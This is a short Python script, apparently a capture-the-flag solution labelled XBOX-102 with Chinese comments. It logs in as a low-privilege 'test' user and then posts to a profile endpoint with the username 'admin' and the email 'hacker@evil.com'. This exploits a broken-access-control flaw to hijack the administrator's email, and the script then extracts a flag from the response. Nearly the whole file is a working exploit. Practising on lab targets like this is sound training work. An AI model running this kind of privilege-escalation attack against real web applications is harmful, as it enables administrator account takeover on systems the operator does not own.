# coding:utf-8
import requests
import re
import sys

"""
@文件命名：XBOX-102
@使用方式: python 102.py http://127.0.0.1:8000
@简述思路: 利用越权漏洞，登录 test 用户后，修改 admin 邮箱，获取 flag
"""


def Scan(url):
    flag = ""
    try:
        s = requests.Session()
        # 登录 test 用户
        login_data = {"username": "test", "password": "test"}
        s.post(url + "/login", data=login_data)
        # 越权修改 admin 邮箱
        profile_data = {"email": "hacker@evil.com", "username": "admin"}
        r = s.post(url + "/profile", data=profile_data)
        # 匹配 flag
        match = re.search(r"(flag\{.*?\}|FLAG\{.*?\})", r.text)
        if match:
            flag = match.group(1)
        else:
            print("Flag not found, response:", r.text)
    except Exception as e:
        print(e)
    return flag


if __name__ == "__main__":
    print(Scan(url=sys.argv[1]))
